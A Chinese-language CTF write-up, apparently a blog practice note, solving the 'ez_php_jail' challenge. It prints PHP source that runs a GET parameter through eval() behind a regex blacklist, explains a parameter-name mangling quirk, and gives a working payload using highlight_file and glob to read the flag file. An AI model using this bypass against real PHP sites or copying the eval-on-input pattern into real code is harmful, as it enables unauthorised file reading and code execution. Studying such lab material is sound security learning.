---
title: ez_php_jail
date: 2025-03-26 20:21:52
tags:
- 命令执行
- glob函数
category:
- 刷题笔记
---

# ez_php_jail

首先启动靶机并访问。上来就能看到源码

```

<?php
highlight_file(__FILE__);
error_reporting(0);
include("hint.html");
$Jail = $_GET['Jail_by.Happy'];

if($Jail == null) die("Do You Like My Jail?");

function Like_Jail($var) {
    if (preg_match('/(`|\$|a|c|s|require|include)/i', $var)) {
        return false;
    }
    return true;
}

if (Like_Jail($Jail)) {
    eval($Jail);
    echo "Yes! you escaped from the jail! LOL!";
} else {
    echo "You will Jail in your life!";
}
echo "\n";

// 在HTML解析后再输出PHP源代码

?>


Welcome to My Jail
Do You Like My Jail?
```

很明显要我们利用eval危险函数来进行命令执行。

首先看到这个传参$Jail = $_GET['Jail_by.Happy'];，很明显是PHP GET传参特性

**当 php 版本⼩于 8 时，GET 请求的参数名含有 . ，会被转为 _ ，但是如果参数名中有 [ ，这**

**个 [ 会被直接转为 _ ，但是后⾯如果有 . ，这个 . 就不会被转为 _ 。**

```
?Jail[by.Happy=
```

---

然后要经过一次正则过滤，

```
(preg_match('/(`|\$|a|c|s|require|include)/i', $var)
```

查看源代码，发现提示我们访问一个文件`ph0_info_Like_jail.php`

访问之后发现是一个phpinfo页面，里面我们能看到禁用了很多函数

```
disable_functions

exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,readfile,require,require_once,include,include_once,file
```

---

发现没有过滤highlight_file函数，完美绕过正则和禁用函数

payload：

```
?Jail[by.Happy=highlight_file(glob("/f*")[0]);
```

这里用到了glob函数

---

## 知识点

### glob函数

- 这是 PHP 中的函数调用，用于查找文件。
- `glob` 是一个标准的 PHP 函数，接受一个模式作为参数，并返回匹配该模式的文件路径。

**用法**：

- 返回值是一个数组，其中包含所有符合条件的文件名。如果找到了符合条件的文件，`glob()` 会列出这些文件。

例如：

```
glob("/f*")
```

- `"/f*"` 表示在根目录下查找所有以 `f` 开头的文件和目录。

glob("/f*")[0]表示数组中第0位的文件名

---

### glob伪协议

- `glob` 伪协议通常用于以特定的语法描述如何查找匹配方式的文件，利用通配符（例如 `*` 和 `?`）来指定文件名模式。

- 通配符

  ：

  - `*` 表示零个或多个字符。
  - `?` 表示单个字符。

- **伪协议格式**：可以考虑一种类似于 `glob:///path/to/files/*.txt` 的格式，这表示在指定目录下查找所有以 `.txt` 结尾的文件。
